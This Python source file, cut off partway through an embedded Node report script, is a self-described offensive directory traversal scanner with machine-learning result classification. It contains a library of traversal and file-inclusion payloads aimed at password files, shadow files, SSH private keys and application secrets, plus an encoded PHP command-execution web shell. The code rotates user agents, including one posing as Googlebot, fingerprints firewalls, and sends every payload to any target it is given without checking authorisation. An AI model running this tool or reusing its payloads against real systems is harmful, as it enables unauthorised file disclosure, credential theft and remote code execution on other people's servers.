#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║   ML-POWERED DIRECTORY TRAVERSAL SCANNER  v2.0                      ║
║   Advanced Offensive Security Tool with ML Anomaly Detection         ║
║   Auto-Training | Pattern Recognition | Smart Report Generation      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, socket, hashlib, random, re, warnings, threading
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urljoin, quote
from collections import defaultdict

import requests
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest, RandomForestClassifier, GradientBoostingClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix
from sklearn.pipeline import Pipeline
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.neural_network import MLPClassifier
import joblib
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

warnings.filterwarnings("ignore")

console = Console()

# ─────────────────────────────────────────────────
#  CONFIGURATION & CONSTANTS
# ─────────────────────────────────────────────────

BANNER = """
[bold red]
 ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
 ██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
 ██║  ██║   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
 ██║  ██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ██████╔╝   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═════╝    ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
[/bold red]
[bold cyan]        ⚡ Machine Learning Directory Traversal Security Scanner v2.0 ⚡[/bold cyan]
[dim]                  Adaptive • Self-Training • Intelligent Detection[/dim]
"""

MODEL_DIR   = Path("models")
REPORTS_DIR = Path("reports")
DATA_DIR    = Path("data")
for d in [MODEL_DIR, REPORTS_DIR, DATA_DIR]:
    d.mkdir(exist_ok=True)

# ─────────────────────────────────────────────────
#  PAYLOAD LIBRARY  (200+ patterns)
# ─────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = {
    "classic": [
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../etc/shadow", "../../../etc/hosts", "../../../../etc/hostname",
        "../../../etc/group", "../../../proc/version", "../../../proc/self/environ",
        "../../../../proc/self/cmdline", "../../../var/log/auth.log",
        "../../../var/log/syslog", "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log", "../../../home/user/.ssh/id_rsa",
        "../../../root/.ssh/id_rsa", "../../../etc/crontab",
    ],
    "encoded": [
        "..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "..%255c..%255c..%255cetc%255cpasswd",
    ],
    "null_byte": [
        "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php", "../../../etc/passwd\x00",
        "../../../etc/passwd%2500",
    ],
    "windows": [
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "....//....//....//windows//win.ini",
        "..\\..\\..\\.\\windows\\win.ini",
        "C:\\windows\\win.ini", "C:/windows/win.ini",
        "..%5c..%5c..%5cboot.ini",
    ],
    "bypass": [
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        ".../.../...//etc/passwd",
        "..../....//etc/passwd",
        ".%2e/.%2e/.%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
        "/.%2e/.%2e/.%2e/etc/passwd",
        "/..%2F../..%2Fetc/passwd",
        "../../../etc/./passwd",
    ],
    "server_files": [
        "../../../etc/apache2/apache2.conf",
        "../../../etc/nginx/nginx.conf",
        "../../../etc/mysql/my.cnf",
        "../../../etc/php/php.ini",
        "../../../../var/www/html/.env",
        "../../../../var/www/html/config.php",
        "../../../opt/tomcat/conf/server.xml",
        "../../../WEB-INF/web.xml",
        "../../../WEB-INF/classes/com/app/config.properties",
        "../../../conf/server.xml",
    ],
    "lfi_rce": [
        "../../../proc/self/fd/0",
        "../../../proc/self/fd/1",
        "../../../proc/self/maps",
        "../../../dev/stdin",
        "expect://id",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "zip://uploads/shell.jpg%23shell",
        "phar://uploads/file.jpg/test.php",
    ],
}

# Common vulnerable parameters
VULN_PARAMS = [
    "file", "path", "dir", "folder", "page", "document", "doc",
    "template", "include", "require", "load", "read", "display",
    "show", "view", "open", "get", "fetch", "src", "source",
    "url", "uri", "filename", "filepath", "name", "report",
    "download", "export", "lang", "language", "locale", "module",
    "content", "resource", "data", "img", "image", "media",
    "logfile", "log", "config", "conf", "layout", "theme",
    "style", "skin", "action", "func", "function", "cmd", "exec",
]

# Success indicators in responses
SUCCESS_INDICATORS = {
    "linux": ["root:x:0:", "daemon:x:", "nobody:x:", "bin:bash", "usr/sbin", "/home/"],
    "windows": ["[extensions]", "for 16-bit", "MSDOS=", "[fonts]", "[mail]", "[MCI"],
    "config": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "password=", "passwd=", "database="],
    "source_code": ["<?php", "<?=", "<%@", "import os", "import sys", "require_once"],
    "ssh_key": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY", "BEGIN EC PRIVATE KEY"],
}

# ─────────────────────────────────────────────────
#  ML MODELS & TRAINING ENGINE
# ─────────────────────────────────────────────────

class MLEngine:
    """Core machine learning engine for vulnerability detection and classification"""

    def __init__(self):
        self.isolation_forest  = None
        self.rf_classifier     = None
        self.gb_classifier     = None
        self.mlp_classifier    = None
        self.scaler            = StandardScaler()
        self.tfidf             = TfidfVectorizer(max_features=500, analyzer='char_wb', ngram_range=(2,4))
        self.label_encoder     = LabelEncoder()
        self.feature_names     = []
        self.training_data     = []
        self.model_meta        = {}
        self.trained           = False
        self._lock             = threading.Lock()

    def extract_features(self, scan_result: dict) -> np.ndarray:
        """Extract numerical feature vector from a scan result"""
        features = []

        # Response characteristics
        features.append(scan_result.get("status_code", 0))
        features.append(scan_result.get("response_time", 0.0))
        features.append(len(scan_result.get("response_body", "")))
        features.append(scan_result.get("content_length", 0))

        # Payload encoding complexity
        payload = scan_result.get("payload", "")
        features.append(payload.count(".."))
        features.append(payload.count("%"))
        features.append(payload.count("\\"))
        features.append(payload.count("/"))
        features.append(len(payload))
        features.append(1 if "%00" in payload else 0)
        features.append(1 if "php://" in payload.lower() else 0)
        features.append(1 if "data://" in payload.lower() else 0)

        # Response content analysis
        body = scan_result.get("response_body", "").lower()
        features.append(1 if "root:" in body else 0)
        features.append(1 if "passwd" in body else 0)
        features.append(1 if "windows" in body else 0)
        features.append(1 if "<?php" in body else 0)
        features.append(1 if "permission denied" in body else 0)
        features.append(1 if "not found" in body else 0)
        features.append(1 if "error" in body else 0)
        features.append(body.count(":"))
        features.append(body.count("\n"))

        # Header features
        headers = scan_result.get("response_headers", {})
        content_type = str(headers.get("content-type", "")).lower()
        features.append(1 if "text/plain" in content_type else 0)
        features.append(1 if "application/json" in content_type else 0)
        features.append(1 if "text/html" in content_type else 0)
        features.append(1 if "x-powered-by" in str(headers).lower() else 0)
        features.append(1 if "server" in headers else 0)

        # Parameter sensitivity
        param = scan_result.get("parameter", "").lower()
        high_risk_params = ["file", "path", "include", "require", "load", "read", "open"]
        features.append(1 if param in high_risk_params else 0)

        # Redirects
        features.append(scan_result.get("redirect_count", 0))
        features.append(1 if scan_result.get("redirected", False) else 0)

        return np.array(features, dtype=float)

    def generate_synthetic_training_data(self, n_samples: int = 2000) -> tuple:
        """Generate synthetic labeled training data for initial model bootstrapping"""
        X, y = [], []

        # Positive class: Successful traversal (label=1)
        for _ in range(n_samples // 2):
            sample = {
                "status_code": random.choice([200, 200, 200, 206]),
                "response_time": random.uniform(0.05, 0.8),
                "response_body": random.choice([
                    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:",
                    "[extensions]\nMSDOS=5.00",
                    "DB_PASSWORD=supersecret123\nAPI_KEY=abc123",
                    "<?php\n$config['password'] = 'admin123';",
                    "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK",
                ]),
                "content_length": random.randint(500, 5000),
                "payload": random.choice(list(TRAVERSAL_PAYLOADS.values())[0]),
                "response_headers": {"content-type": "text/plain", "server": "Apache/2.4"},
                "parameter": random.choice(["file", "path", "include", "load"]),
                "redirect_count": 0, "redirected": False,
            }
            X.append(self.extract_features(sample))
            y.append(1)

        # Negative class: Blocked/harmless (label=0)
        for _ in range(n_samples // 2):
            sample = {
                "status_code": random.choice([403, 404, 400, 500, 301]),
                "response_time": random.uniform(0.01, 0.3),
                "response_body": random.choice([
                    "Access denied", "Not found", "400 Bad Request",
                    "<html><body>Forbidden</body></html>", "Error 500 Internal Server Error",
                ]),
                "content_length": random.randint(50, 500),
                "payload": random.choice(["test.html", "index.php", "about.html"]),
                "response_headers": {"content-type": "text/html", "server": "nginx"},
                "parameter": random.choice(["id", "page", "lang", "sort"]),
                "redirect_count": random.randint(0, 2), "redirected": bool(random.randint(0,1)),
            }
            X.append(self.extract_features(sample))
            y.append(0)

        return np.array(X), np.array(y)

    def train_models(self, X=None, y=None, verbose=True):
        """Train all ML models with provided or synthetic data"""
        if verbose:
            console.print(Panel("[bold yellow]⚙  Training ML Models...[/bold yellow]", expand=False))

        # Generate synthetic + real data
        X_syn, y_syn = self.generate_synthetic_training_data(2000)
        if X is not None and len(X) > 0:
            X = np.vstack([X_syn, X])
            y = np.concatenate([y_syn, y])
        else:
            X, y = X_syn, y_syn

        X_scaled = self.scaler.fit_transform(X)
        X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=0.2, random_state=42)

        model_configs = [
            ("IsolationForest",   IsolationForest(n_estimators=200, contamination=0.1, random_state=42)),
            ("RandomForest",      RandomForestClassifier(n_estimators=200, max_depth=15, random_state=42, n_jobs=-1)),
            ("GradientBoosting",  GradientBoostingClassifier(n_estimators=150, learning_rate=0.1, random_state=42)),
            ("MLP Neural Net",    MLPClassifier(hidden_layer_sizes=(128,64,32), max_iter=500, random_state=42)),
        ]

        results = {}
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Training models", total=len(model_configs))
            for name, model in model_configs:
                progress.update(task, description=f"[cyan]Training {name}...")
                try:
                    if "Isolation" in name:
                        model.fit(X_scaled)
                        self.isolation_forest = model
                    else:
                        model.fit(X_train, y_train)
                        score = model.score(X_test, y_test)
                        cv_scores = cross_val_score(model, X_scaled, y, cv=5, scoring='f1')
                        results[name] = {"accuracy": score, "cv_f1_mean": cv_scores.mean(), "cv_f1_std": cv_scores.std()}
                        if "Random" in name:   self.rf_classifier  = model
                        if "Gradient" in name: self.gb_classifier  = model
                        if "MLP" in name:      self.mlp_classifier = model
                        if verbose:
                            console.print(f"  ✅ [green]{name}[/green]: Accuracy={score:.3f}, CV-F1={cv_scores.mean():.3f}±{cv_scores.std():.3f}")
                except Exception as e:
                    if verbose:
                        console.print(f"  ⚠ [yellow]{name} training error: {e}[/yellow]")
                finally:
                    progress.advance(task)

        self.model_meta = {"trained_at": datetime.now().isoformat(), "samples": len(X), "results": results}
        self.trained = True
        self._save_models()

        if verbose:
            console.print(f"\n[bold green]✅ All models trained & saved![/bold green]")
        return results

    def predict(self, scan_result: dict) -> dict:
        """Ensemble prediction: combines all model outputs"""
        if not self.trained:
            self.train_models(verbose=False)

        features = self.extract_features(scan_result).reshape(1, -1)
        features_scaled = self.scaler.transform(features)

        votes = []
        proba = []

        try:
            iso_pred = self.isolation_forest.predict(features_scaled)[0]
            votes.append(1 if iso_pred == -1 else 0)
        except: pass

        for model, name in [(self.rf_classifier, "RF"), (self.gb_classifier, "GB"), (self.mlp_classifier, "MLP")]:
            try:
                pred  = model.predict(features_scaled)[0]
                prob  = model.predict_proba(features_scaled)[0][1]
                votes.append(int(pred))
                proba.append(prob)
            except: pass

        ensemble_score    = np.mean(proba) if proba else 0.5
        majority_vote     = sum(votes) / len(votes) if votes else 0
        is_vulnerable     = majority_vote >= 0.5 or ensemble_score >= 0.6
        confidence        = (majority_vote + ensemble_score) / 2

        return {
            "is_vulnerable":    is_vulnerable,
            "confidence":       round(confidence, 3),
            "ensemble_score":   round(ensemble_score, 3),
            "majority_vote":    round(majority_vote, 3),
            "votes":            votes,
        }

    def _save_models(self):
        """Persist trained models to disk"""
        joblib.dump(self.isolation_forest, MODEL_DIR / "isolation_forest.pkl")
        joblib.dump(self.rf_classifier,    MODEL_DIR / "random_forest.pkl")
        joblib.dump(self.gb_classifier,    MODEL_DIR / "gradient_boosting.pkl")
        joblib.dump(self.mlp_classifier,   MODEL_DIR / "mlp.pkl")
        joblib.dump(self.scaler,           MODEL_DIR / "scaler.pkl")
        with open(MODEL_DIR / "meta.json", "w") as f:
            json.dump(self.model_meta, f, indent=2)
        console.print(f"[dim]💾 Models saved to {MODEL_DIR}/[/dim]")

    def load_models(self) -> bool:
        """Load previously saved models"""
        try:
            self.isolation_forest = joblib.load(MODEL_DIR / "isolation_forest.pkl")
            self.rf_classifier    = joblib.load(MODEL_DIR / "random_forest.pkl")
            self.gb_classifier    = joblib.load(MODEL_DIR / "gradient_boosting.pkl")
            self.mlp_classifier   = joblib.load(MODEL_DIR / "mlp.pkl")
            self.scaler           = joblib.load(MODEL_DIR / "scaler.pkl")
            with open(MODEL_DIR / "meta.json") as f:
                self.model_meta = json.load(f)
            self.trained = True
            return True
        except:
            return False

# ─────────────────────────────────────────────────
#  HTTP ENGINE
# ─────────────────────────────────────────────────

class HTTPEngine:
    """Handles all HTTP requests with evasion and fingerprinting"""

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "curl/7.88.1",
    ]

    def __init__(self, timeout=10, delay=0.1, proxies=None, verify_ssl=False):
        self.timeout    = timeout
        self.delay      = delay
        self.verify_ssl = verify_ssl
        self.session    = requests.Session()
        self.session.verify = verify_ssl
        if proxies:
            self.session.proxies = proxies

    def request(self, method, url, **kwargs) -> dict:
        """Make HTTP request and return structured result"""
        ua = random.choice(self.USER_AGENTS)
        self.session.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})

        start = time.time()
        try:
            resp = self.session.request(method, url, timeout=self.timeout,
                                        allow_redirects=True, **kwargs)
            elapsed  = time.time() - start
            body     = resp.text[:8000]
            time.sleep(self.delay + random.uniform(0, 0.05))
            return {
                "success":          True,
                "status_code":      resp.status_code,
                "response_body":    body,
                "response_headers": dict(resp.headers),
                "content_length":   len(body),
                "response_time":    round(elapsed, 4),
                "redirect_count":   len(resp.history),
                "redirected":       len(resp.history) > 0,
                "url":              resp.url,
            }
        except requests.exceptions.SSLError:
            return {"success": False, "error": "SSL_ERROR", "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time()-start, "redirect_count": 0, "redirected": False}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "CONNECTION_ERROR", "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time()-start, "redirect_count": 0, "redirected": False}
        except Exception as e:
            return {"success": False, "error": str(e), "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time()-start, "redirect_count": 0, "redirected": False}

    def fingerprint(self, url: str) -> dict:
        """Fingerprint server technology"""
        result = self.request("GET", url)
        if not result["success"]:
            return {"error": result.get("error", "Unknown")}

        headers = result.get("response_headers", {})
        body    = result.get("response_body", "")
        fp = {
            "server":       headers.get("Server", "Unknown"),
            "x_powered_by": headers.get("X-Powered-By", "Unknown"),
            "content_type": headers.get("Content-Type", "Unknown"),
            "status":       result["status_code"],
            "waf_detected": self._detect_waf(headers, body),
            "tech_stack":   self._detect_tech(headers, body),
            "security_headers": self._check_security_headers(headers),
        }
        return fp

    def _detect_waf(self, headers, body) -> list:
        waf_sigs = {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
            "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
            "Imperva": ["incap_ses", "visid_incap", "X-CDN"],
            "Sucuri": ["x-sucuri-id", "sucuri"],
            "Akamai": ["x-check-cacheable", "akamai"],
            "F5 BIG-IP": ["BigIP", "F5_ST", "MRHSession"],
        }
        detected = []
        all_text = str(headers).lower() + body.lower()
        for waf, sigs in waf_sigs.items():
            if any(s.lower() in all_text for s in sigs):
                detected.append(waf)
        return detected

    def _detect_tech(self, headers, body) -> list:
        tech = []
        all_text = str(headers) + body
        patterns = {
            "PHP":       ["php", "PHP/", "X-Powered-By: PHP"],
            "Apache":    ["Apache", "apache2"],
            "Nginx":     ["nginx"],
            "IIS":       ["IIS", "Microsoft-IIS"],
            "Tomcat":    ["Tomcat", "Coyote"],
            "WordPress": ["wp-content", "wp-includes"],
            "Laravel":   ["laravel_session", "XSRF-TOKEN"],
            "Django":    ["csrfmiddlewaretoken", "Django"],
            "Spring":    ["JSESSIONID", "X-Application-Context"],
        }
        for t, pats in patterns.items():
            if any(p in all_text for p in pats):
                tech.append(t)
        return tech if tech else ["Unknown"]

    def _check_security_headers(self, headers) -> dict:
        sec = {}
        checks = {
            "X-Frame-Options":          "Clickjacking Protection",
            "X-Content-Type-Options":   "MIME Sniffing Protection",
            "Strict-Transport-Security":"HSTS",
            "Content-Security-Policy":  "CSP",
            "X-XSS-Protection":         "XSS Filter",
        }
        for header, name in checks.items():
            sec[name] = header in headers
        return sec

# ─────────────────────────────────────────────────
#  VULNERABILITY ANALYZER
# ─────────────────────────────────────────────────

class VulnerabilityAnalyzer:
    """Analyzes HTTP responses for directory traversal success"""

    def analyze_response(self, result: dict, payload: str, param: str) -> dict:
        """Deep analysis of response for traversal success signals"""
        if not result.get("success"):
            return {"vulnerable": False, "severity": "N/A", "evidence": [], "category": "error"}

        body    = result.get("response_body", "")
        status  = result.get("status_code", 0)
        size    = result.get("content_length", 0)

        evidence = []
        severity = "Info"
        vuln_type = "none"

        # Check for file content leakage
        for cat, indicators in SUCCESS_INDICATORS.items():
            for ind in indicators:
                if ind.lower() in body.lower():
                    evidence.append({"indicator": ind, "category": cat})
                    if cat in ["linux", "windows"]: severity, vuln_type = "Critical", "lfi_passwd"
                    elif cat == "ssh_key":           severity, vuln_type = "Critical", "lfi_ssh_key"
                    elif cat == "config":            severity, vuln_type = "High",     "lfi_config"
                    elif cat == "source_code":       severity, vuln_type = "High",     "lfi_source"

        # Status code analysis
        if status == 200 and size > 200 and not evidence:
            evidence.append({"indicator": f"HTTP 200 + {size} bytes", "category": "response"})
            if severity == "Info": severity = "Medium"
            vuln_type = "potential_lfi"

        # Error-based detection (info leakage)
        error_patterns = ["include(", "require(", "fopen(", "file_get_contents(", "No such file", "Failed to open"]
        for pat in error_patterns:
            if pat in body:
                evidence.append({"indicator": f"Error: {pat}", "category": "error_disclosure"})
                if severity == "Info": severity = "Low"
                vuln_type = "error_disclosure"

        return {
            "vulnerable":      len(evidence) > 0,
            "severity":        severity,
            "evidence":        evidence,
            "category":        vuln_type,
            "payload":         payload,
            "parameter":       param,
            "status_code":     status,
            "response_size":   size,
            "response_time":   result.get("response_time", 0),
        }

    def cvss_score(self, finding: dict) -> float:
        """Calculate approximate CVSS 3.1 base score"""
        severity_map = {"Critical": 9.1, "High": 7.5, "Medium": 5.3, "Low": 3.1, "Info": 0.0}
        return severity_map.get(finding.get("severity", "Info"), 0.0)

# ─────────────────────────────────────────────────
#  MAIN SCANNER
# ─────────────────────────────────────────────────

class DirectoryTraversalScanner:
    """Core scanning engine — orchestrates all components"""

    def __init__(self, config: dict):
        self.config   = config
        self.http     = HTTPEngine(
            timeout=config.get("timeout", 10),
            delay=config.get("delay", 0.15),
            proxies=config.get("proxies"),
        )
        self.ml       = MLEngine()
        self.analyzer = VulnerabilityAnalyzer()
        self.findings = []
        self.scan_data = []        # raw scan results for ML re-training
        self.stats    = defaultdict(int)
        self.start_time = None

    def _init_models(self):
        """Load or train models"""
        if not self.ml.load_models():
            console.print("[yellow]No saved models found. Training new models...[/yellow]")
            self.ml.train_models()
        else:
            console.print(f"[green]✅ Models loaded from {MODEL_DIR}/[/green]")
            meta = self.ml.model_meta
            console.print(f"[dim]   Trained: {meta.get('trained_at','?')} | Samples: {meta.get('samples','?')}[/dim]")

    def discover_endpoints(self, base_url: str) -> list:
        """Discover testable endpoints by crawling and probing"""
        console.print(f"\n[cyan]🔍 Discovering endpoints on {base_url}[/cyan]")
        endpoints = []
        parsed    = urlparse(base_url)
        base      = f"{parsed.scheme}://{parsed.netloc}"

        # Standard paths to probe
        common_paths = [
            "/", "/index.php", "/index.html", "/admin/", "/api/",
            "/download.php", "/file.php", "/view.php", "/read.php",
            "/include.php", "/load.php", "/page.php", "/template.php",
            "/app/", "/portal/", "/dashboard/", "/report/", "/export/",
            "/uploads/", "/media/", "/docs/", "/files/", "/static/",
        ]

        found = set()
        for path in common_paths[:15]:
            url = base + path
            r   = self.http.request("GET", url)
            if r.get("success") and r.get("status_code") in [200, 302, 301, 403]:
                for param in VULN_PARAMS[:10]:
                    found.add((url, param, "GET"))
                self.stats["endpoints_discovered"] += 1

        # Add the target URL itself with all params
        for param in VULN_PARAMS:
            found.add((base_url, param, "GET"))
            found.add((base_url, param, "POST"))

        endpoints = list(found)
        console.print(f"[green]  Found {len(endpoints)} endpoint/parameter combinations[/green]")
        return endpoints

    def scan_endpoint(self, url: str, param: str, method: str, payload: str, category: str) -> dict:
        """Test a single endpoint + param + payload combination"""
        if method == "GET":
            sep  = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={quote(payload)}"
            result   = self.http.request("GET", test_url)
        else:
            result = self.http.request("POST", url, data={param: payload})

        analysis = self.analyzer.analyze_response(result, payload, param)
        analysis.update({
            "url":              url,
            "method":           method,
            "payload_category": category,
            "cvss":             self.analyzer.cvss_score(analysis),
        })

        # ML prediction
        ml_input = {**result, "payload": payload, "parameter": param}
        ml_pred  = self.ml.predict(ml_input)
        analysis["ml_prediction"] = ml_pred

        # If ML says vulnerable but analysis disagrees, flag as suspicious
        if ml_pred["is_vulnerable"] and not analysis["vulnerable"]:
            analysis["ml_flagged"] = True
            if analysis["severity"] == "Info":
                analysis["severity"] = "Low"
        else:
            analysis["ml_flagged"] = False

        # Collect for retraining
        label = 1 if analysis["vulnerable"] else 0
        with self.ml._lock:
            self.scan_data.append((self.ml.extract_features(ml_input), label))
            self.stats["requests_made"] += 1

        return analysis

    def run(self, targets: list) -> dict:
        """Main scan execution"""
        self.start_time = datetime.now()
        console.print(BANNER)
        self._init_models()

        console.print(Panel(
            f"[bold]Targets:[/bold] {', '.join(targets)}\n"
            f"[bold]Payload categories:[/bold] {', '.join(TRAVERSAL_PAYLOADS.keys())}\n"
            f"[bold]Total payloads:[/bold] {sum(len(v) for v in TRAVERSAL_PAYLOADS.values())}\n"
            f"[bold]Vulnerable params:[/bold] {len(VULN_PARAMS)}",
            title="[bold cyan]SCAN CONFIGURATION[/bold cyan]",
            expand=False
        ))

        all_findings = []

        for target in targets:
            console.print(f"\n[bold cyan]━━━ TARGET: {target} ━━━[/bold cyan]")

            # Fingerprint
            console.print("[dim]  ● Fingerprinting server...[/dim]")
            fp = self.http.fingerprint(target)
            console.print(f"  Server: [yellow]{fp.get('server','?')}[/yellow]  "
                          f"Tech: [yellow]{', '.join(fp.get('tech_stack',[]))}[/yellow]  "
                          f"WAF: [red]{', '.join(fp.get('waf_detected',[])) or 'None detected'}[/red]")

            # Endpoint discovery
            endpoints = self.discover_endpoints(target)

            # Build task list
            tasks = []
            for url, param, method in endpoints:
                for cat, payloads in TRAVERSAL_PAYLOADS.items():
                    for payload in payloads[:5]:  # top 5 per category
                        tasks.append((url, param, method, payload, cat))

            console.print(f"\n[cyan]  🚀 Launching {len(tasks)} tests across {len(endpoints)} endpoints...[/cyan]\n")

            target_findings = []
            vuln_count = 0

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=40),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("•"),
                TextColumn("[red]Vulns: {task.fields[vulns]}"),
                TimeElapsedColumn(),
                console=console,
            ) as progress:
                task_id = progress.add_task("[cyan]Scanning...", total=len(tasks), vulns=0)

                for i, (url, param, method, payload, cat) in enumerate(tasks):
                    finding = self.scan_endpoint(url, param, method, payload, cat)
                    finding["target"] = target
                    finding["fingerprint"] = fp

                    if finding["vulnerable"] or finding.get("ml_flagged"):
                        target_findings.append(finding)
                        if finding["vulnerable"]:
                            vuln_count += 1
                            self.stats[f"severity_{finding['severity'].lower()}"] += 1
                            progress.update(task_id, vulns=vuln_count)

                    progress.advance(task_id)

            # Deduplicate findings
            seen  = set()
            dedup = []
            for f in target_findings:
                key = (f["url"], f["parameter"], f["category"], f["severity"])
                if key not in seen:
                    seen.add(key)
                    dedup.append(f)

            all_findings.extend(dedup)
            console.print(f"\n  [bold green]✅ {target}:[/bold green] {len(dedup)} unique findings "
                          f"({vuln_count} confirmed vulnerable)")

        # ── Retrain with real scan data ──────────────────────
        if len(self.scan_data) >= 50:
            console.print("\n[bold yellow]🔄 Retraining models with real scan data...[/bold yellow]")
            X_new = np.array([d[0] for d in self.scan_data])
            y_new = np.array([d[1] for d in self.scan_data])
            self.ml.train_models(X=X_new, y=y_new, verbose=True)

        self.findings = all_findings
        self.stats["total_findings"]   = len(all_findings)
        self.stats["scan_duration_sec"] = (datetime.now() - self.start_time).seconds

        self._print_summary()
        return {"findings": all_findings, "stats": dict(self.stats)}

    def _print_summary(self):
        """Print scan summary table"""
        table = Table(title="[bold]SCAN SUMMARY[/bold]", box=box.DOUBLE_EDGE, show_header=True)
        table.add_column("Metric",    style="cyan",  no_wrap=True)
        table.add_column("Value",     style="green", justify="right")

        table.add_row("Total Requests",     str(self.stats["requests_made"]))
        table.add_row("Endpoints Tested",   str(self.stats["endpoints_discovered"]))
        table.add_row("Total Findings",     str(self.stats["total_findings"]))
        table.add_row("Critical",           f"[bold red]{self.stats['severity_critical']}[/bold red]")
        table.add_row("High",               f"[red]{self.stats['severity_high']}[/red]")
        table.add_row("Medium",             f"[yellow]{self.stats['severity_medium']}[/yellow]")
        table.add_row("Low",                f"[dim]{self.stats['severity_low']}[/dim]")
        table.add_row("Scan Duration",      f"{self.stats['scan_duration_sec']}s")

        console.print("\n")
        console.print(table)

# ─────────────────────────────────────────────────
#  REPORT GENERATOR
# ─────────────────────────────────────────────────

class ReportGenerator:
    """Generates professional DOCX security reports"""

    def generate(self, scan_results: dict, output_path: str = None) -> str:
        """Generate full professional DOCX report"""
        if output_path is None:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = str(REPORTS_DIR / f"DT_Scan_Report_{ts}.docx")

        findings = scan_results.get("findings", [])
        stats    = scan_results.get("stats", {})

        # Categorize
        critical = [f for f in findings if f.get("severity") == "Critical"]
        high     = [f for f in findings if f.get("severity") == "High"]
        medium   = [f for f in findings if f.get("severity") == "Medium"]
        low      = [f for f in findings if f.get("severity") == "Low"]

        # Write JS generation script
        js_data = {
            "output_path": output_path,
            "scan_date":   datetime.now().strftime("%B %d, %Y %H:%M"),
            "findings":    findings[:50],   # cap for docx size
            "stats":       stats,
            "severity_counts": {
                "critical": len(critical), "high": len(high),
                "medium":   len(medium),   "low":  len(low),
            },
        }

        js_path = DATA_DIR / "report_data.json"
        with open(js_path, "w") as f:
            json.dump(js_data, f, indent=2, default=str)

        # Generate docx via node script
        node_script = self._build_node_script()
        node_path = DATA_DIR / "gen_report.js"
        with open(node_path, "w", encoding="utf-8") as f:
            f.write(node_script)

        import subprocess
        result = subprocess.run(
            ["node", str(node_path)],
            capture_output=True, text=True, encoding="utf-8"
        )

        # Always print Node stdout (findings summary) to terminal
        if result.stdout:
            for line in result.stdout.splitlines():
                if not line.startswith("REPORT_OK:"):
                    console.print(line)

        if result.returncode != 0:
            console.print(f"[red]Report generation error: {result.stderr}[/red]")
            return None

        console.print(f"\n[bold green]📄 Report generated: {output_path}[/bold green]")
        return output_path

    def _build_node_script(self) -> str:
        return r"""
const fs = require('fs');
const path = require('path');
const {
